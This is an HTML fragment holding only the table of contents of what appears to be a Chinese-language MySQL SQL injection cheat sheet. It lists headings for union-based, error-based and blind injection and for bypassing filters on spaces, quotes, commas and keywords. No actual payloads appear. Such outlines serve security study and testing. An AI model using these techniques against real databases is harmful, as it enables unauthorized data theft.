Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint 数值操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (长度限制32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (长度限制32位)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错 &#x2F; 主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用几何函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用不存在的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">利用 name_const</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using 注列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">报错函数速查表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Based"><span class="toc-number">1.3.</span> <span class="toc-text">Blind Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Boolean%EF%BC%881-or-0%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">Boolean（1 or 0）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Time（无回显）</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">爆库、表、字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint 数值操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (长度限制32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (长度限制32位)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错 &#x2F; 主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用几何函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用不存在的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">利用 name_const</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using 注列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">报错函数速查表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Based"><span class="toc-number">1.3.</span> <span class="toc-text">Blind Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Boolean%EF%BC%881-or-0%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">Boolean（1 or 0）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Time（无回显）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Common Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#and-or"><span class="toc-number">1.4.1.</span> <span class="toc-text">and &#x2F; or</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.4.2.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.4.3.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">1.4.4.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.4.5.</span> <span class="toc-text">其他系统关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA-%E8%BD%AC%E4%B9%89"><span class="toc-number">1.4.6.</span> <span class="toc-text">单双引号被过滤 &#x2F; 拦截 &#x2F; 转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">1.4.7.</span> <span class="toc-text">数字</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">1.5.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">1.5.1.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">常用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">系统信息函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">进制转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%88%AA%E5%8F%96-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">字符截取&#x2F;拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">常见全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">其他常用函数 &#x2F; 语句</span></a></li></ol></li></ol></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
